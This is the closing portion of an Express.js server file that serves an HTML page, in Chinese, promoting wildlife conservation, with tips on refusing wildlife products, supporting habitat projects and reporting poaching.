    <p>保护野生动物不需要超能力，只需要你我每一个微小的行动。拒绝野味、不购买野生动物制品、支持生态保护项目。</p>
    <div class="cta-actions">
      <a class="cta-btn primary" href="https://www.worldwildlife.org" target="_blank">🌱 了解更多</a>
      <a class="cta-btn secondary" href="https://www.iucnredlist.org" target="_blank">📋 IUCN 红色名录</a>
    </div>
  </div>

  <h2 class="section-title">💡 <span>你可以做的事</span></h2>

  <div class="tips">
    <div class="tip-item">
      <div class="icon">🚫</div>
      <div class="text">
        <h4>拒绝野生动物制品</h4>
        <p>不购买象牙、犀角、穿山甲鳞片等野生动物制品，从源头减少对野生动物的需求。</p>
      </div>
    </div>
    <div class="tip-item">
      <div class="icon">🌿</div>
      <div class="text">
        <h4>支持生态保护</h4>
        <p>关注并支持本地和国际生态保护组织，参与植树造林和栖息地恢复项目。</p>
      </div>
    </div>
    <div class="tip-item">
      <div class="icon">📢</div>
      <div class="text">
        <h4>传播保护意识</h4>
        <p>在社交媒体上分享野生动物保护知识，让更多人了解生物多样性的重要性。</p>
      </div>
    </div>
    <div class="tip-item">
      <div class="icon">🔍</div>
      <div class="text">
        <h4>举报违法行为</h4>
        <p>如发现非法猎捕、贩卖野生动物的行为，请拨打 12315 或联系当地林业部门举报。</p>
      </div>
    </div>
    <div class="tip-item">
      <div class="icon">♻️</div>
      <div class="text">
        <h4>减少碳排放</h4>
        <p>气候变化是野生动物面临的最大威胁之一。低碳出行、节约能源，为地球降温。</p>
      </div>
    </div>
  </div>

  <footer>
    <div class="hearts">🐼 🐅 🐘 🐋 🦏 🦅</div>
    <p>守护每一个生灵，因为我们共享同一个地球</p>
    <p style="margin-top: 8px;">Wildlife Conservation &copy; ${new Date().getFullYear()}</p>
  </footer>
</body>
</html>`;
  res.send(html);
});

app.listen(PORT, () => console.log(`http server is running on port:${PORT}!`));
